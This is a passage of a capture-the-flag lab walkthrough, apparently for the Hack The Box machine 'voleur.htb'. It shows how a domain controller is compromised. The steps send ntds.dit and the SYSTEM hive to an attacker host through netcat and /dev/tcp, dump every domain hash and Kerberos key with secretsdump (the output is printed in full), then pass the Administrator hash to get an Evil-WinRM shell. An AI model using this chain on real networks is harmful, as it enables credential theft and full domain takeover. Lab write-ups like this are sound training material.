ED25519 key fingerprint is SHA256:mKWAEwLTnEN2bJNi7fkc+BZodiXCIiP3ywSLJiZL0ss.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:31: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[voleur.htb]:2222' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.4.0-20348-Microsoft x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Oct 31 03:53:21 PDT 2025

  System load:    0.52      Processes:             9
  Usage of /home: unknown   Users logged in:       0
  Memory usage:   31%       IPv4 address for eth0: 10.10.11.76
  Swap usage:     0%


363 updates can be installed immediately.
257 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Jan 30 04:26:24 2025 from 127.0.0.1
 * Starting OpenBSD Secure Shell server sshd                                                                  [ OK ] 
svc_backup@DC:~$ 

```
Exploring the file system reveals the `/mnt` directory:

```
svc_backup@DC:~$ cd /mnt
svc_backup@DC:/mnt$ ls
c
```

### Step 2: Exploring the C Drive Mount

The `/mnt/c` directory appears to be a mount of the Windows C: drive:

```
svc_backup@DC:/mnt/c$ ls
ls: cannot access 'DumpStack.log.tmp': Permission denied
ls: cannot access 'pagefile.sys': Permission denied
'$Recycle.Bin'             DumpStack.log.tmp   PerfLogs               Recovery                     inetpub
'$WinREAgent'              Finance            'Program Files'        'System Volume Information'   pagefile.sys
 Config.Msi                HR                 'Program Files (x86)'   Users
'Documents and Settings'   IT                  ProgramData            Windows
```
### Step 3: Locating Backup Files
Navigating to the IT directory reveals the Third-Line Support folder:

```
svc_backup@DC:/mnt/c$ cd It
svc_backup@DC:/mnt/c/It$ ls
'First-Line Support'  'Second-Line Support'  'Third-Line Support'
svc_backup@DC:/mnt/c/It$ cd 'Third-Line Support'
svc_backup@DC:/mnt/c/It/Third-Line Support$ ls
Backups  Note.txt.txt  id_rsa
```

Inside the Backups directory, we find critical registry files:

```
svc_backup@DC:/mnt/c/It/Third-Line Support/Backups$ cd registry
svc_backup@DC:/mnt/c/It/Third-Line Support/Backups/registry$ ls
SECURITY  SYSTEM
```

And in the Active Directory backup:

```
svc_backup@DC:/mnt/c/It/Third-Line Support/Backups/Active Directory$ ls
ntds.dit
```

### Step 4: Transferring Files to Attacker Machine
Using netcat to transfer the ntds.dit file:

**On attacker machine:**

```
nc -nlvp 9000 > ntds.dit
```
**On target machine:**

```
svc_backup@DC:/mnt/c/It/Third-Line Support/Backups/Active Directory$ cat ntds.dit > /dev/tcp/10.10.14.19/9000
```

Transferring the SYSTEM hive:

**On attacker machine:**

```
nc -nlvp 9000 > SYSTEM
```

**On target machine:**

```
svc_backup@DC:/mnt/c/It/Third-Line Support/Backups/registry$ cat SYSTEM > /dev/tcp/10.10.14.19/9000
```

### Step 5: Extracting Domain Hashes

With both ntds.dit and SYSTEM files, use impacket-secretsdump to extract domain credentials:

```
impacket-secretsdump -system SYSTEM -ntds ntds.dit local
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
Administrator:des-cbc-md5:459d836b9edcd6b0
DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7
DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782
DC$:des-cbc-md5:64e05b6d1abff1c8
krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145
krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211
krbtgt:des-cbc-md5:34ae31d073f86d20
voleur.htb\ryan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74
voleur.htb\ryan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1
voleur.htb\ryan.naylor:des-cbc-md5:4376f7917a197a5b
voleur.htb\marie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d
voleur.htb\marie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f
voleur.htb\marie.bryant:des-cbc-md5:cdf1492604d3a220
voleur.htb\lacey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9
voleur.htb\lacey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066
voleur.htb\lacey.miller:des-cbc-md5:6eef922076ba7675
voleur.htb\svc_ldap:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910
voleur.htb\svc_ldap:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f
voleur.htb\svc_ldap:des-cbc-md5:1ab0fbfeeaef5776
voleur.htb\svc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f
voleur.htb\svc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd
voleur.htb\svc_backup:des-cbc-md5:7ab513f8ab7f765e
voleur.htb\svc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258
voleur.htb\svc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395
voleur.htb\svc_iis:des-cbc-md5:70ce25431c577f92
voleur.htb\jeremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0
voleur.htb\jeremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27
voleur.htb\jeremy.combs:des-cbc-md5:192f702abff75257
voleur.htb\svc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114
voleur.htb\svc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831
voleur.htb\svc_winrm:des-cbc-md5:32b61fb92a7010ab
[*] Cleaning up... 
```

### Step 6: Gaining Administrator Access
Using the extracted Administrator hash to obtain a Kerberos ticket:

```
impacket-getTGT voleur.htb/Administrator -hashes :e656e07c56d831611b577b160b259ad2 -dc-ip 10.10.11.76
export KRB5CCNAME=Administrator.ccache
```

Access the system via Evil-WinRM:
```
evil-winrm -i dc.voleur.htb  -r voleur.htb                                      
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

The root flag can be found at: `C:\Users\Administrator\Desktop\root.txt`
